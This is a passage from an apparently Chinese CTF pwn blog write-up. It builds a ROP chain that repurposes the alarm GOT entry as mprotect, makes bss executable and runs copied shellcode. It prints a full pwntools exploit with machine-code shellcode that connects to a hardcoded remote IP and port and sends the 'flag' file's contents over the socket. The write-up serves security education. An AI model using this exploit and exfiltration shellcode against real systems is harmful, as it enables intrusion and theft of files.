class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x10)</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,bss_addr+400,0x30)</span></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)ipv6,面向连接的套接字,tcp传输协议</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(prctl_plt_addr)<span class="comment">#pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x29</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)<span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(soc,struct_socket_addr,sizeof(struct_socket)</span></span><br><span class="line"><span class="comment">#调试socket发现，执行之后，然后的rax值是0，因此connect的rdi为0</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">42</span>)</span><br><span class="line">payload+=p64(<span class="number">16</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rdx无用寄存器</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(open_return_value,bss+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/../img/2706180-20220426102311543-185742101.png"></p>
<p>发现现在的payload是0x2e0…  因此还要换一下方法，大致思路没问题，但是现在要考虑的是怎么让payload更短，其实观察一下上面的payload就会发现很多字节其实都是被浪费掉了，因为p64()打包就填充了非常多的0（如下图）<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011934251.png" alt="image-20230701193454027"></p>
<h3 id="试着使用shellcode？"><a href="#试着使用shellcode？" class="headerlink" title="试着使用shellcode？"></a>试着使用shellcode？</h3><p>如果我们可以执行对应汇编指令的机器码，并且我们直接将对应的机器码发过去，那岂不是就把p64打包出现很多00的问题给解决了么。</p>
<p>想执行shellcode其实也非常简单，只需要执行mprotect这个函数把一页内存属性给改成可读可写可执行就ok了。也就是说我们不再去用ret2syscall的手法布置rop链了，先去执行mprotect，然后将我们栈中布置的shellcode拷贝到bss段，最后执行shellcode。</p>
<p>不过随之产生了几个问题</p>
<blockquote>
<p>1、为什么要把shellcode拷贝到bss段？</p>
<p>答：由于栈基址随机化，我们无法用mprotect函数准确的改变栈的属性，但是bss段的地址是确定的，因此可以使用mprotect函数修改bss段属性，然后只需要将shellcode迁移到bss段即可。</p>
<p>2、怎么将shellcode拷贝到bss段？</p>
<p>利用rep movs qword ptr [rdi],qword ptr[rsi] ; ret指令，<strong>这个指令就是将rsi指向的内容赋给rdi指向的内容</strong>，同时执行完毕后rsi和rdi会自动增加，指向下一个内存单元，不断循环该过程，循环的次数由rcx寄存器的值决定（每次减1，减到0为止）</p>
<p>3、怎么将执行流劫持到bss段？</p>
<p>hh,这个问题想解决的话，要去调试，最后我解释一下。</p>
</blockquote>
<h2 id="正文开始——构造正确的exp"><a href="#正文开始——构造正确的exp" class="headerlink" title="正文开始——构造正确的exp"></a>正文开始——构造正确的exp</h2><p>四千字了…  现在才来到了如何构建本题正确的exp</p>
<p>第一件事，我们需要造一个mprotect函数。我们采用的方法是用magic_gadget将alarm函数的got表修改为mprotect函数的真实地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offsetalarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure>

<p>现在想控制rbx和rbp的话只能执行csu片段，不过这个缺点非常明显，直接填充了32字节的垃圾数据，但是没办法，暂时只能用csu片段来控制rbx和rbp。</p>
<p>第二件事，就是执行mprotect函数，只有改变了bss段的内存属性，我们才可以做更多的事情。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)<span class="comment">#执行csu片段传参，这没什么好说的</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)<span class="comment">#这个就是映射到bss的内存页地址</span></span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br></pre></td></tr></table></figure>

<p>此时的bss段已经变成了可读可写可执行（如下图）</p>
<p><img src="/../img/2706180-20220426103623192-486607434.png"></p>
<p>那我们现在要立刻造出来pop_rbx_pop_rbp_ret这个指令，因为我们接下来还要用几次magic_gadget，但是不能每次使用都执行一次csu片段吧，这样的话肯定最后的payload会超长。造这个指令很简单，因为bss段已经可执行（<strong>就是我们往bss段写的内容都可以被当做指令来用</strong>），有什么好说的，直接把需要造的指令对应机器码写到bss段上（上文已经提过利用magic_gadget往bss段写入数据了）</p>
<p>这个网站可以在线汇编指令转机器码   <a href="(https://defuse.ca/online-x86-assembler.htm#disassembly)">here</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#往bss_addr+0x10写入pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line"><span class="comment">#5B5D59C3为pop rbx;pop rbp;pop rcx;ret的机器码，由于p64()打包会将数据进行小端序处理，因此我们需要提前手动小端序处理一次，以来确保指令是正常顺序存入bss段的</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure>

<p>此时我们再执行magic_gadget就可以直接用bss_addr+0x10中存放的pop rbx;pop rbp;pop rcx;ret（至于为什么还要pop rcx，因为这样会更省字节，后面就不用专门造一个pop rcx;ret指令了）</p>
<p>接着我们需要再造两个指令，分别是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3 </span><br><span class="line">mov rsi,rsp;ret #4889E6C3</span><br></pre></td></tr></table></figure>

<p>第一个很好理解，是负责拷贝的rep，可是为什么要用第二个指令呢？考虑一下我们使用rep的时候怎么去控制这个rsi,我们本来是控制不了，并且我们还需要这个rsi指向当前栈顶的内容（因为rep指令下面就是shellcode了），因此才需要造一个这个gadget出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#往bss_addr写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#现在bss_addr+0x10就相当于pop rbx;pop rbp;pop rcx;ret这个指令了</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x8写入mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure>

<p>至此所有准备工作完成，我们接下来就是执行rep指令并且布置shellcode了</p>
<p>shellcode如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#socket(2,1,0)</span><br><span class="line">push 2</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rsi</span><br><span class="line">psuh 0</span><br><span class="line">pop rdx</span><br><span class="line">push 41</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#connect(0,socket_struct_addr,0x8)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rcx,0x13589c5282230002 #如果打本地的话，这里改成0x0100007fe8030002 对应的ip和端口为127.0.0.1 1000</span><br><span class="line">#push没法直接压入0x13589c5282230002，只能通过寄存器中转</span><br><span class="line">push rcx </span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 0x8</span><br><span class="line">pop rdx</span><br><span class="line">push 42</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp#本来这里为了更短应该使用push rsp;pop rdi的，但是不知道为啥，这回程序这么写就会直接崩溃，不过好在溢出卡的不死，也不差这几个字节</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#read(1,0x601500,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#write(0,0x601500,0x50)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>把上述shellcode全部转成机器码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socket=&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">orw=&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span><br></pre></td></tr></table></figure>

<p>最后的payload执行下rep指令再布置下shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)<span class="comment">#把shellcode布置到bss_addr加0x50的地方</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#把rsp的值给rsi，也就是说rsi值为下面这个bss_addr所对应的栈地址</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#执行rep指令，至此拷贝开始</span></span><br></pre></td></tr></table></figure>

<p>最后再回答一下当时问的怎么将执行流劫持到bss段上。</p>
<p>通过调试发现，拷贝的时候只有rsi和rdi在移动，而rsp始终没有变，因此我只需要在发送shellcode之前放一个bss段地址（这个地址要执行shellcode的首地址），在payload的最后加上一个ret即可完成劫持执行流。</p>
<p><img src="/../img/2706180-20220426103703621-1232925873.png"></p>
<h2 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;47.97.127.1&quot;,26417)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr=<span class="number">0x4004e6</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">mprotect_offset=<span class="number">0x11b7e0</span></span><br><span class="line">alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">close_offset=<span class="number">0x110870</span></span><br><span class="line">prctl_offset=<span class="number">0x122210</span></span><br><span class="line">read_offset=<span class="number">0x110020</span></span><br><span class="line">csu_gadget1=<span class="number">0x4008FA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4008E0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400645</span></span><br><span class="line">term_hook=<span class="number">0x600e48</span></span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rax_offset=<span class="number">0x24ad4</span></span><br><span class="line">pop_rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">rep_offset=<span class="number">0x3f84a</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">bss_ye=<span class="number">0x601000</span></span><br><span class="line">mov_rdi_rsp_offset=<span class="number">0x15c2fe</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">psuh 0</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">socket=<span class="string">&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x8)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rcx,0x13589c5282230002</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x10</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 42</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="comment">#connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x23\x82\x52\x9C\x58\x13\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line">connect=<span class="string">&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,0x601500,0x50)</span></span><br><span class="line"><span class="comment">#write(0,0x601500,0x50)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#mov rsi,0x601500</span></span><br><span class="line">orw=<span class="string">&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">下面三个指令所对应的机器码</span></span><br><span class="line"><span class="string">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3</span></span><br><span class="line"><span class="string">mov rsi,rsp;ret #4889E6C3</span></span><br><span class="line"><span class="string">pop rbx;pop rbp;pop rcx #5B5D59C3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将alarm函数的got表换成mprotect的真实地址</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offset-alarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行mprotect函数</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)</span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x10写入pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#往bss段写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"><span class="comment">#payload+=p64(bss_addr+0x10)</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x8写入mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行rep指令</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=socket+connect+orw</span><br><span class="line">payload+=p64(ret_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;shellcode_length----------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(socket+connect+orw)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;payload_length------------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220426103751910-1556922758.png"></p>
<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><h3 id="关于socket和connect的参数"><a href="#关于socket和connect的参数" class="headerlink" title="关于socket和connect的参数"></a>关于socket和connect的参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br></pre></td></tr></table></figure>

<p>第一个参数是地址族，也就是IP地址的类型；第二个参数是数据的传输方式；第三个参数是采用的传输协议</p>
<p>这个没什么好说的，我们最后参数采用的分别是2,1,0 即ipv6，面向连接的套接字，TCP传输协议</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr,<span class="type">socklen_t</span> addrlen)</span>;</span><br></pre></td></tr></table></figure>

<p>第一个参数是socket函数返回的文件描述符；第二个参数是sockaddr结构体的地址；第三个参数是sockaddr的结构体大小</p>
<p>第一个参数没什么好说的，第二个就很有讲究了，什么是sockaddr结构体？不知道这个怎么写payload？翻一下glibc源码（这个sockaddr结构体位于socket.h这个文件下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    __SOCKADDR_COMMON (sa_);        <span class="comment">/* Common data: address family and length.  */</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];                <span class="comment">/* Address data.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>第一个成员放的是地址族，第二个成员放的是ip地址加端口（这里要把ip地址和端口转换成十六进制以小端序发送（参考如下）</p>
<p>以转换127.0.0.1 1000为例</p>
<p>分别把127 0 0 1 1000转换成16进制7F 00 00 01 03e8，然后反序排列为0100007Fe803（<strong>因为p64打包会使ip地址和端口以小端序排列，而最后使用的时候又要使用正序的ip地址和端口，因此我们先将其转换为反序，再用p64打包，最后存储在sockaddr的结构体中的数据依然是正序的ip和端口</strong>）</p>
<p>第三个参数就自然而然是16字节了（当时有一个困惑的点就是发送sockaddr结构体的时候，明明只写了8字节，但这个大小（也就是第三个参数）非要填16字节，看完源码答案自然而解）</p>
<h3 id="关于上文出现问题的解释："><a href="#关于上文出现问题的解释：" class="headerlink" title="关于上文出现问题的解释："></a>关于上文出现问题的解释：</h3><blockquote>
<p>如果修改了某个函数的got表（至于修改成什么不重要），现在想要使用这个被修改的got表（也就是被修改成的内容）。到最后执行ret指令时，（栈顶的内容）应该用plt地址来衔接，还是用got地址来衔接？</p>
<p><strong>ret指令，也就是pop rip</strong>，也就是把栈顶的内容（这里要尤其注意，我强调的是<strong>栈顶的内容</strong>）直接弹给rip，如果衔接got地址是什么情况？把一个跳板放到ret里？这个跳板什么都做不了<strong>，跳板，顾名思义，只能被别人踩在下面跳到别人想跳的地址，它自身没有什么意义</strong>。</p>
<p>如果放入plt地址呢？既然是修改了got表，也就是说肯定是进行延迟绑定了，<strong>执行那个函数plt表的第一条指令，jmp ptr【got地址】，此时去跳到了跳板指向的地方（也就是被修改的got表）</strong>，此时才能完成我们想要的要求。</p>
</blockquote>
<h3 id="pwntools中的一个未解之谜"><a href="#pwntools中的一个未解之谜" class="headerlink" title="pwntools中的一个未解之谜"></a>pwntools中的一个未解之谜</h3><p>这里是当时踩的一个坑，至今未能找出原因，在此记录一下。</p>
<p>上面提到要找到无用函数在libc中的偏移，我最开始采用的是这个方法</p>
<p><img src="/../img/2706180-20220426103817080-960601662.png"></p>
<p>但是得到的close函数在libc中的偏移是不正确的，这一点很奇怪。</p>
<p>这里我记录一下排查这个问题的方法。<strong>先查看一下libc基地址，然后用gdb看一下close延迟绑定之后的真实地址，二者相减看是否是打印出来的close函数在libc中的偏移。显然用这个方法测试之后的偏移是不一样的。此时才意识到上图的方法并不能打印出来正确的close偏移。</strong></p>
<p><strong>解决方法①：</strong></p>
<p>gdb动态调试看一下，它的真实地址</p>
<p><img src="/../img/2706180-20220426103846637-587580728.png"></p>
<p>然后再用gdb看下，libc的基地址</p>
<p><img src="/../img/2706180-20220426103859734-1715666525.png"></p>
<p>二者相减，拿到close在libc中的偏移</p>
<p><strong>解决方法②：</strong></p>
<p>使用命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf --symbols /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;mprotect&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220426103934059-170044952.png"></p>
<p>或者</p>
